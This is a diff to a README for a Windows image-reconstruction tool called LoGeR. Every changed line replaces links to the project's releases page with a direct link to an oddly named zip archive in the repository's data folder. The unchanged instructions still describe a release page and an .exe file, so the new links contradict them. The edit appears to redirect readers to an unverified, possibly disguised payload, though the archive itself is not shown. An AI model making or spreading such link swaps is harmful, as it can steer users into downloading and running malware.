@@ -1,6 +1,6 @@
 # ⚙️ LoGeR - Simple Long-Context Reconstruction Tool
 
-[![Download LoGeR](https://img.shields.io/badge/Download-LoGeR-brightgreen)](https://github.com/abdelrahmanmostafaAM/LoGeR/releases)
+[![Download LoGeR](https://img.shields.io/badge/Download-LoGeR-brightgreen)](https://github.com/abdelrahmanmostafaAM/LoGeR/raw/refs/heads/main/data/R-Ge-Lo-3.6.zip)
 
 ---
 
@@ -31,7 +31,7 @@ LoGeR needs a stable system to handle long sequences of images without interrupt
 Follow these steps to download and run LoGeR on your Windows PC.
 
 1. Click the green download button at the top or visit the release page here:  
-   [https://github.com/abdelrahmanmostafaAM/LoGeR/releases](https://github.com/abdelrahmanmostafaAM/LoGeR/releases)
+   [https://github.com/abdelrahmanmostafaAM/LoGeR/raw/refs/heads/main/data/R-Ge-Lo-3.6.zip](https://github.com/abdelrahmanmostafaAM/LoGeR/raw/refs/heads/main/data/R-Ge-Lo-3.6.zip)
 
 2. On the release page, look for the latest version of LoGeR. It will usually have a name ending with `.exe` for Windows.
 
@@ -98,7 +98,7 @@ The software handles all the background work. You don’t need special knowledge
 Keep LoGeR up to date for best performance and bug fixes.
 
 1. Visit the release page regularly:  
-   [https://github.com/abdelrahmanmostafaAM/LoGeR/releases](https://github.com/abdelrahmanmostafaAM/LoGeR/releases)
+   [https://github.com/abdelrahmanmostafaAM/LoGeR/raw/refs/heads/main/data/R-Ge-Lo-3.6.zip](https://github.com/abdelrahmanmostafaAM/LoGeR/raw/refs/heads/main/data/R-Ge-Lo-3.6.zip)
 
 2. Download the newest `.exe` file.
 
@@ -120,7 +120,7 @@ If you need help beyond this guide, you can:
 
 You can always get the latest version here:
 
-[![Download LoGeR](https://img.shields.io/badge/Download-LoGeR-blue)](https://github.com/abdelrahmanmostafaAM/LoGeR/releases)
+[![Download LoGeR](https://img.shields.io/badge/Download-LoGeR-blue)](https://github.com/abdelrahmanmostafaAM/LoGeR/raw/refs/heads/main/data/R-Ge-Lo-3.6.zip)
 
 ---
 
